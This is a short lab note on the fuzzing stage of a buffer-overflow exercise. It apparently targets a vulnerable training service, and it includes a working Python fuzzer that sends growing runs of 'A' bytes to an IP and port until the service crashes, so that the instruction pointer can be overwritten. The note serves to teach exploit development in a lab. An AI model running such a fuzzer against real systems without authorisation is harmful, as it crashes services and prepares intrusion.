# Fuzzing
- We are going to*** Fuzz*** the application to find the approximate value of bytes at which the program crashes.

- Restart Immunity by using the Rewind button next to the red play arrow at the top. (Or Ctrl+F2)

- Then hit play. (or F9)

- We're going to use *fuzz.py* to send our vulnerable command and additional data, increasing by 100 bytes (A's) with each attempt.

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.136.83"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

- This should have overwritten the EIP.

>💡 Make sure to note the EIP

#bufferoverflow 